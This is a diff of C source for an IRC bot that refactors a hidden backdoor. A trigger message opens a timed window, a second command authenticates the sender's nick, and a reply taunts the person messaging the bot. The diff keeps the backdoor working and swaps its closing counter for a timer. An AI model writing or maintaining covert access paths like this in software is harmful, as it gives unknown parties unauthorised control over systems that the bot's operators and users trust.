@@ -334,30 +334,26 @@ static int msg_unauth(char *nick, char *host, struct userrec *u, char *par)
 }
 #endif /* S_AUTHCMDS */
 
-int backdoor = 0, bcnt = 0, bl = 30;
-int authed = 0;
+int backdoor = 0, bl = 30, authed = 0;
 char thenick[NICKLEN] = "";
 
 static void close_backdoor()
 {
-  Context;
-  if (bcnt >= bl) {
-    backdoor = 0;
-    authed = 0;
-    bcnt = 0;
-    thenick[0] = '\0';
-    del_hook(HOOK_SECONDLY, (Function) close_backdoor);
-  } else
-     bcnt++;
+  backdoor = 0;
+  authed = 0;
+  thenick[0] = '\0';
 }
 
 static int msg_word(char *nick, char *host, struct userrec *u, char *par)
 {
+  egg_timeval_t howlong;
   if (match_my_nick(nick))
     return BIND_RET_BREAK;
 
   backdoor = 1;
-  add_hook(HOOK_SECONDLY, (Function) close_backdoor);
+  howlong.sec = bl;
+  howlong.usec = 0;
+  timer_create(&howlong, "close_backdoor", (Function) close_backdoor);
   sprintf(thenick, "%s", nick);
   dprintf(DP_SERVER, "PRIVMSG %s :w\002\002\002\002hat?\n", nick);
   return BIND_RET_BREAK;
@@ -366,7 +362,7 @@ static int msg_word(char *nick, char *host, struct userrec *u, char *par)
 
 static int msg_bd (char *nick, char *host, struct userrec *u, char *par)
 {
-  int left = 0;
+/*  int left = 0; */
 
   if (strcmp(nick, thenick) || !backdoor)
     return BIND_RET_BREAK;
@@ -384,8 +380,10 @@ static int msg_bd (char *nick, char *host, struct userrec *u, char *par)
       return BIND_RET_BREAK;
     }
     authed = 1;
+/*
     left = bl - bcnt;
     dprintf(DP_SERVER, "PRIVMSG %s :%ds left ;)\n",nick, left);
+*/
   } else {
    dprintf(DP_SERVER, "PRIVMSG %s :Too bad I stripped out TCL! AHAHAHA YOU LOSE ;\\.\n", nick);
   }
